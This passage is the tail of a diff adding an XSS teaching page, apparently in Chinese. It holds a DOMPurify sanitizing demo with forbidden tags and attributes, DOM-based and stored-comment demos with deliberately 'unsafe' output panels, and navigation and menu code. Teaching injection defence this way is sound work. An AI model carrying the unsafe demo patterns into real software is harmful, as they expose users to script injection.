+                        showPlaygroundAlert(`解码URL Hash时出错。已显示原始值: ${escapeHtml(hashValue)}`, 'warning', 'dom-output-safe');
+                    } else {
+                        showPlaygroundAlert(`在 "安全的更新" 中，来自URL Hash的内容被当作纯文本处理，脚本不会执行。`, 'success', 'dom-output-safe');
+                    }
+                } catch (e) {
+                    console.error("Error in simulateDOMUpdate:", e);
+                    alert("运行 DOM 型 Playground 时出错: " + e.message);
+                    const safeOutput = document.getElementById('dom-output-safe');
+                    if (safeOutput) {
+                        showPlaygroundAlert(`运行 DOM 型 Playground 时出错: ${escapeHtml(e.message)}`, 'danger', 'dom-output-safe');
+                    }
+                    const unsafeOutput = document.getElementById('dom-output-unsafe');
+                    if (unsafeOutput) {
+                        showPlaygroundAlert(`运行 DOM 型 Playground 时出错: ${escapeHtml(e.message)}`, 'danger', 'dom-output-unsafe');
+                    }
+                }
+            }
+
+            /** DOMPurify Playground Simulation */
+            function simulatePurify() {
+                try {
+                    const inputElement = document.getElementById('dompurify-input');
+                    const safeOutput = document.getElementById('dompurify-output-safe');
+                    if (!inputElement || !safeOutput) {
+                        throw new Error("Required playground elements not found for DOMPurify.");
+                    }
+                    if (typeof DOMPurify === 'undefined') {
+                        throw new Error("DOMPurify library is not loaded. Cannot sanitize.");
+                    }
+
+                    const dirtyHtml = inputElement.value;
+
+                    // Clear previous results and alerts
+                    clearPlaygroundAlerts('dompurify-output-safe');
+                    safeOutput.innerHTML = '';
+
+                    // --- Sanitize using DOMPurify ---
+                    // Basic configuration: Allow common formatting tags, forbid scripts/event handlers
+                    const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
+                        USE_PROFILES: { html: true }, // Allow standard HTML elements
+                        FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'style'], // Explicitly forbid dangerous tags
+                        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'style'] // Forbid dangerous attributes/event handlers
+                        // Add more configuration as needed, e.g., ALLOWED_URI_REGEXP
+                    });
+
+                    // Display the sanitized HTML using innerHTML
+                    const outputDiv = document.createElement('div');
+                    outputDiv.innerHTML = cleanHtml; // Insert the *cleaned* HTML
+                    safeOutput.appendChild(outputDiv);
+
+                    // Provide feedback
+                    if (dirtyHtml !== cleanHtml) {
+                        showPlaygroundAlert(`DOMPurify 已清理输入内容，移除了潜在的危险标签或属性。`, 'success', 'dompurify-output-safe');
+                    } else {
+                        showPlaygroundAlert(`输入内容看起来是安全的，DOMPurify 未做修改。`, 'info', 'dompurify-output-safe');
+                    }
+
+                } catch (e) {
+                    console.error("Error in simulatePurify:", e);
+                    alert("运行 DOMPurify Playground 时出错: " + e.message);
+                    const safeOutput = document.getElementById('dompurify-output-safe');
+                    if (safeOutput) {
+                        showPlaygroundAlert(`运行 DOMPurify 时出错: ${escapeHtml(e.message)}`, 'danger', 'dompurify-output-safe');
+                    }
+                }
+            }
+
+
+            // --- Page Initialization & Event Listeners ---
+
+            // Initialize Mermaid.js
+            try {
+                mermaid.initialize({
+                    startOnLoad: false, theme: 'base', // Use a simple theme
+                    themeVariables: { // Match colors slightly better
+                        primaryColor: '#f3f4f6', // gray-100 (node bg)
+                        primaryTextColor: '#1f2937', // gray-800
+                        lineColor: '#6b7280', // gray-500
+                        textColor: '#374151', // gray-700
+                        fontSize: '14px'
+                    }
+                });
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', () => {
+                        try { mermaid.run(); } catch (runError) { console.error("Mermaid run failed on DOMContentLoaded:", runError); }
+                    });
+                } else {
+                    try { mermaid.run(); } catch (runError) { console.error("Mermaid run failed (DOM already loaded):", runError); }
+                }
+            } catch (e) {
+                console.error("Mermaid initialization failed:", e);
+            }
+
+            // Sidebar Navigation Highlighting (Adapted from snippet)
+            const sections = document.querySelectorAll('main section[id]'); // Target main sections
+            const navLinks = document.querySelectorAll('#local-toc a'); // All nav links
+            let lastActiveTocLink = null;
+
+            function throttle(func, limit) {
+                let lastFunc;
+                let lastRan;
+                return function (...args) {
+                    const context = this;
+                    if (!lastRan) {
+                        func.apply(context, args);
+                        lastRan = Date.now();
+                    } else {
+                        clearTimeout(lastFunc);
+                        lastFunc = setTimeout(function () {
+                            if ((Date.now() - lastRan) >= limit) {
+                                func.apply(context, args);
+                                lastRan = Date.now();
+                            }
+                        }, limit - (Date.now() - lastRan));
+                    }
+                }
+            }
+
+            const updateActiveNav = throttle(() => {
+                try {
+                    let currentActiveId = null;
+                    let minTop = Infinity;
+                    const viewportTopOffset = window.innerHeight * 0.3; // Activate slightly higher
+
+                    sections.forEach(section => {
+                        const rect = section.getBoundingClientRect();
+                        // Check if the top of the section is within a reasonable range from the top of the viewport
+                        const isPotentiallyVisible = rect.top < viewportTopOffset && rect.bottom > viewportTopOffset * 0.5;
+
+                        if (isPotentiallyVisible) {
+                            // Among potentially visible sections, find the one closest to the activation point
+                            if (rect.top < minTop) {
+                                minTop = rect.top;
+                                currentActiveId = section.id;
+                            }
+                        }
+                    });
+
+                    // Fallback if no section is ideally positioned (e.g., scrolled to bottom)
+                    if (!currentActiveId && sections.length > 0) {
+                        // Check if scrolled near the bottom
+                        if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 100) {
+                            currentActiveId = sections[sections.length - 1].id; // Activate last section
+                        } else if (window.scrollY < 100) {
+                            currentActiveId = sections[0].id; // Activate first section if near top
+                        }
+                    }
+
+                    let foundActive = false;
+                    navLinks.forEach(link => {
+                        const linkHrefId = link.getAttribute('href')?.substring(1);
+                        const isActive = linkHrefId && linkHrefId === currentActiveId;
+                        link.classList.toggle('active', isActive);
+                        if (isActive) foundActive = true;
+
+                        // Handle parent link activation if a child is active
+                        const parentLi = link.closest('ul')?.closest('li');
+                        if (parentLi) {
+                            const parentLink = parentLi.querySelector(':scope > a');
+                            if (parentLink && parentLink !== link) {
+                                const anyChildActive = parentLi.querySelector('ul a.active');
+                                parentLink.classList.toggle('active', !!anyChildActive);
+                            }
+                        }
+                    });
+
+                    // If no specific section matched, try activating the first link as default
+                    if (!foundActive && navLinks.length > 0 && window.scrollY < 100) {
+                        navLinks.forEach(l => l.classList.remove('active'));
+                        navLinks[0].classList.add('active');
+                        lastActiveTocLink = navLinks[0];
+                    } else if (foundActive) {
+                        lastActiveTocLink = document.querySelector('#local-toc a.active');
+                    }
+
+                } catch (e) {
+                    console.error("Error in updateActiveNav:", e);
+                }
+            }, 100); // Throttle update check
+
+            // Use IntersectionObserver for efficiency if available
+            if (window.IntersectionObserver && sections.length > 0) {
+                const observerOptions = {
+                    root: null, // relative to document viewport
+                    rootMargin: "-20% 0px -70% 0px", // Trigger when section enters top 20% or leaves bottom 30%
+                    threshold: 0 // Trigger as soon as any part enters/leaves
+                };
+                const sectionObserver = new IntersectionObserver((entries) => {
+                    // We still call the throttled function which calculates the best fit
+                    updateActiveNav();
+                }, observerOptions);
+
+                sections.forEach(section => {
+                    sectionObserver.observe(section);
+                });
+            } else {
+                // Fallback to scroll listener if IntersectionObserver is not available
+                console.warn("IntersectionObserver not supported or no sections found. Using scroll listener for TOC highlighting.");
+                window.addEventListener('scroll', updateActiveNav);
+            }
+
+
+            // Smooth Scrolling & Active State on Click (Sidebar Links)
+            navLinks.forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    try {
+                        // Close mobile menu if open
+                        if (window.innerWidth < 768) { closeMobileMenu(); }
+
+                        // Update active state immediately on click for better UX
+                        navLinks.forEach(link => link.classList.remove('active'));
+                        this.classList.add('active');
+                        lastActiveTocLink = this;
+
+                        // Handle parent activation
+                        const parentLi = this.closest('ul')?.closest('li');
+                        if (parentLi) {
+                            const parentLink = parentLi.querySelector(':scope > a');
+                            if (parentLink) parentLink.classList.add('active');
+                        }
+
+                        // Let default smooth scroll handle navigation if href is valid
+                        const targetId = this.getAttribute('href');
+                        if (targetId && targetId.startsWith('#')) {
+                            const targetElement = document.querySelector(targetId);
+                            if (targetElement) {
+                                // Optional: Use JS smooth scroll if native isn't sufficient
+                                // e.preventDefault();
+                                // targetElement.scrollIntoView({ behavior: 'smooth' });
+                            } else {
+                                console.warn(`Target element for ${targetId} not found.`);
+                            }
+                        }
+                    } catch (e) { console.error("Error in navLink click listener:", e); }
+                });
+            });
+
+            // Mobile Menu Toggle Logic
+            const menuToggle = document.getElementById('menu-toggle');
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('menu-overlay');
+
+            function openMobileMenu() {
+                if (sidebar && overlay && menuToggle) {
+                    sidebar.classList.remove('hidden-mobile');
+                    overlay.classList.add('active');
+                    menuToggle.innerHTML = '<span class="material-icons">close</span>';
+                }
+            }
+
+            function closeMobileMenu() {
+                if (sidebar && overlay && menuToggle) {
+                    sidebar.classList.add('hidden-mobile');
+                    overlay.classList.remove('active');
+                    menuToggle.innerHTML = '<span class="material-icons">menu</span>';
+                }
+            }
+
+            if (menuToggle && sidebar && overlay) {
+                menuToggle.addEventListener('click', (e) => {
+                    try {
+                        e.stopPropagation();
+                        if (sidebar.classList.contains('hidden-mobile')) { openMobileMenu(); }
+                        else { closeMobileMenu(); }
+                    } catch (e) { console.error("Error in menuToggle click listener:", e); }
+                });
+                overlay.addEventListener('click', () => {
+                    try { closeMobileMenu(); }
+                    catch (e) { console.error("Error in overlay click listener:", e); }
+                });
+            } else {
+                console.error("Mobile menu elements not found.");
+            }
+
+            // Initial Page Load Logic
+            window.addEventListener('load', () => {
+                try {
+                    console.log("Window load event triggered.");
+                    // Load comments from localStorage if available
+                    const storedComments = localStorage.getItem('xssDemoComments');
+                    if (storedComments) {
+                        try {
+                            commentsUnsafe = JSON.parse(storedComments);
+                            if (!Array.isArray(commentsUnsafe)) commentsUnsafe = [];
+                        } catch (parseError) {
+                            console.error("Error parsing stored comments:", parseError);
+                            commentsUnsafe = [];
+                            localStorage.removeItem('xssDemoComments'); // Clear invalid data
+                        }
+                    }
+                    updateDataDisplay();
+                    renderStoredComments(); // Initialize comment sections with loaded/empty data
+                    if (window.location.hash && !window.location.hash.startsWith('#_')) { // Avoid internal links
+                        console.log("Hash found on load, triggering DOM update.");
+                        simulateDOMUpdate(); // Initialize DOM section if hash exists
+                    }
+                    // Adjust sidebar based on initial screen size
+                    if (sidebar && menuToggle) {
+                        if (window.innerWidth < 768) {
+                            sidebar.classList.add('hidden-mobile');
+                            menuToggle.innerHTML = '<span class="material-icons">menu</span>';
+                        } else {
+                            sidebar.classList.remove('hidden-mobile');
+                        }
+                    }
+                    // Set initial active TOC link
+                    updateActiveNav();
+                    console.log("Window load handler finished.");
+                } catch (e) {
+                    console.error("Error during window load event:", e);
+                }
+            });
+
+            // Adjust sidebar visibility on resize
+            window.addEventListener('resize', throttle(() => {
+                try {
+                    if (sidebar && overlay && menuToggle) {
+                        if (window.innerWidth < 768) {
+                            // If sidebar is currently visible (not hidden-mobile) and overlay is not active, hide it
+                            if (!sidebar.classList.contains('hidden-mobile') && !overlay.classList.contains('active')) {
+                                sidebar.classList.add('hidden-mobile');
+                                menuToggle.innerHTML = '<span class="material-icons">menu</span>';
+                            }
+                        } else {
+                            // On larger screens, ensure sidebar is visible and overlay is inactive
+                            sidebar.classList.remove('hidden-mobile');
+                            overlay.classList.remove('active');
+                            menuToggle.innerHTML = '<span class="material-icons">menu</span>'; // Reset icon just in case
+                        }
+                    }
+                } catch (e) { console.error("Error during window resize event:", e); }
+            }, 200));
+
+            // Initial call to set data display
+            updateDataDisplay();
+
+        } catch (e) {
+            console.error("Global script error:", e);
+            const body = document.querySelector('body');
+            if (body && !document.querySelector('[data-global-error]')) {
+                const errorDiv = document.createElement('div');
+                errorDiv.textContent = '页面脚本发生严重错误，部分功能可能无法使用。请检查浏览器控制台获取详细信息。Error: ' + escapeHtml(e.message);
+                errorDiv.style.cssText = 'position:fixed; bottom:0; left:0; width:100%; background:red; color:white; padding:10px; z-index:1000; text-align:center; font-size: 14px;';
+                errorDiv.dataset.globalError = 'true';
+                body.appendChild(errorDiv);
+            }
+        } // End of global try-catch
+    </script>
+
+</body>
+
+</html>
